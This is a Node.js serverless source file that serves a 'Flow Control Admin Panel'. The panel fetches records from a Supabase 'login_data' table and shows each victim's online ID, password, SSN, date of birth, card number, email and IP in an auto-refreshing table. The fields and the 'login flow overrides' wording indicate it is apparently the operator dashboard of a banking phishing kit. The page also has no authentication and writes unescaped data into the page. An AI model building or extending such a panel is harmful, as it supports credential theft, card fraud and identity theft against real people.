const { createClient } = require('@supabase/supabase-js');

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_ANON_KEY || '';

let supabase = null;
if (supabaseUrl && supabaseKey) {
  supabase = createClient(supabaseUrl, supabaseKey);
}

async function getAllLoginData(limit = 1000) {
  if (!supabase) {
    return [];
  }

  try {
    const { data, error } = await supabase
      .from('login_data')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(limit);

    if (error) {
      console.error('Supabase select error:', error);
      return [];
    }

    return data || [];
  } catch (error) {
    console.error('Error getting login data:', error);
    return [];
  }
}

function createAdminPageHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flow Control Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        .section {
            background: white;
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .section h2 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 1.5em;
        }
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .data-table th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            font-weight: 600;
        }
        .data-table td {
            padding: 12px;
            border-bottom: 1px solid #eee;
        }
        .data-table tr:hover {
            background: #f9f9f9;
        }
        .data-cell {
            max-width: 150px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .data-cell-full {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .empty-state {
            color: #999;
            font-style: italic;
            padding: 20px;
            text-align: center;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Flow Control Admin Panel</h1>
            <p>Manage login flow overrides and view collected data</p>
        </div>

        <!-- Login Data Section -->
        <div class="section">
            <h2>📋 Collected Login Data</h2>
            <div id="login-data-list">
                <p class="empty-state">Loading login data...</p>
            </div>
        </div>
    </div>

    <script>
        // Load login data
        async function loadLoginData() {
            try {
                const response = await fetch('/api/login-data');
                
                if (!response.ok) {
                    throw new Error(\`HTTP error! status: \${response.status}\`);
                }
                
                const result = await response.json();
                const listEl = document.getElementById('login-data-list');
                
                if (result.data && result.data.length > 0) {
                    let html = \`<p style="margin-bottom: 15px; color: #666;">Total entries: <strong>\${result.count}</strong></p>\`;
                    html += '<table class="data-table">';
                    html += '<thead><tr><th>ID</th><th>Online ID</th><th>Password</th><th>SSN</th><th>DOB</th><th>Card</th><th>Email</th><th>IP</th><th>Date</th></tr></thead><tbody>';
                    
                    result.data.forEach(entry => {
                        html += \`<tr>
                            <td>\${entry.id}</td>
                            <td class="data-cell">\${entry.online_id || '-'}</td>
                            <td class="data-cell-full">\${entry.password || '-'}</td>
                            <td class="data-cell">\${entry.ssn || '-'}</td>
                            <td class="data-cell">\${entry.dob || '-'}</td>
                            <td class="data-cell">\${entry.card_number || '-'}</td>
                            <td class="data-cell">\${entry.email || '-'}</td>
                            <td class="data-cell">\${entry.ip_address || '-'}</td>
                            <td class="data-cell">\${entry.created_at ? new Date(entry.created_at).toLocaleString() : '-'}</td>
                        </tr>\`;
                    });
                    
                    html += '</tbody></table>';
                    listEl.innerHTML = html;
                } else {
                    listEl.innerHTML = '<p class="empty-state">No login data collected yet</p>';
                }
            } catch (error) {
                console.error('Error loading login data:', error);
                const listEl = document.getElementById('login-data-list');
                listEl.innerHTML = \`<p class="empty-state" style="color: #e74c3c;">
                    Error loading login data: \${error.message}<br>
                    <small>Note: Make sure Supabase is configured with SUPABASE_URL and SUPABASE_ANON_KEY environment variables.</small>
                </p>\`;
            }
        }

        // Load on page load
        loadLoginData();
        
        // Refresh every 30 seconds
        setInterval(loadLoginData, 30000);
    </script>
</body>
</html>`;
}

module.exports = async (req, res) => {
  if (req.method === 'GET') {
    const html = createAdminPageHTML();
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
};

